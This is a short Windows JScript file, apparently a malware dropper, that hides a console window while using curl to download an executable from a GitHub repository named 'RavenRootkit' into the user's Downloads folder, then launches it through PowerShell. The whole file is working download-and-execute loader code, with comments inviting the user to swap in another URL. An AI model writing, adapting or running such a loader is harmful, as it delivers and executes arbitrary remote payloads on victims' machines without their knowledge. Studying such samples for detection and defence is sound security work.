// WScript for downloading and executing a file using PowerShell
var shell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");

// Get the user's Downloads folder
var env = shell.Environment("PROCESS");
var userProfile = env("USERPROFILE");
var downloadsFolder = fso.BuildPath(userProfile, "Downloads");




// URL of the file to download
var fileUrl = "https://github.com/RavenRootkit/PS_execution/raw/refs/heads/main/test24.exe"; // Replace with your URL

// Destination file path
var fileName = "test24.exe"; // Replace with your desired file name
var destination = fso.BuildPath(downloadsFolder, fileName);

// Construct the curl command to download the file
var curlCommand = 'cmd /c curl.exe -Lo "' + destination + '" "' + fileUrl + '"';

// Execute the curl command
var exitCode = shell.Run(curlCommand, 0, true);

if (exitCode === 0) {
    WScript.Echo("File downloaded successfully to: " + destination);

    // Construct the PowerShell command to execute the file
    var powershellCommand = 'powershell.exe start-process "' + destination + '"';

    // Execute the PowerShell script
    var psExitCode = shell.Run(powershellCommand, 1, true);

    if (psExitCode === 0) {
        WScript.Echo("PowerShell script executed successfully.");
    } else {
        WScript.Echo("Failed to execute the PowerShell script. Exit code: " + psExitCode);
    }
} else {
    WScript.Echo("Failed to download the file. Exit code: " + exitCode);
}